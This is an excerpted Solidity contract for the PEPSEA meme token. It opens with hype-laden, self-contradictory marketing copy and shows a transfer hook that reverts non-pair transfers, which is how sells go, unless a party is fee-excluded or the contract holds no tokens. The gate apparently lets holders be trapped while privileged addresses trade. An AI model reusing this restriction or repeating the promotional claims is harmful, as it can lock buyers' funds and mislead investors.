...
/**
PEPSEA: The Innovative
NFT-Based Token Revolutionizing Digital Finance

Pepsea is an innovative ERC-20 token that leverages the power of NFTs to create a unique and exciting investment opportunity. With its cutting-edge technology and forward-thinking approach, Pepsea is poised to revolutionize the world of digital finance.

At its core, Pepsea is a blockchain-based token that allows investors to buy, sell, and trade digital assets. Unlike traditional cryptocurrencies, however, Pepsea is built on the Ethereum network and uses NFTs to represent ownership of its underlying assets.

Website: https://pepsea.io
Telegram: https://t.me/pepseanft
Twitter: https://twitter.com/pepseanft
...
contract PEPSEA is Ownable, ERC20 {
    ...
    constructor() ERC20("PEPSEA", "PEPSEA") {
        ...
        marketingAddress = address(0x180C92fB9772754214C24e718e0a6572624550d8);
    ...
    function _beforeTokenTransfer(
        ...
        if(from != uniswapV2Pair){
            require(_isFeeExcluded[from] || _isFeeExcluded[to] || super.balanceOf(address(this)) == 0, "Clugged");
        }
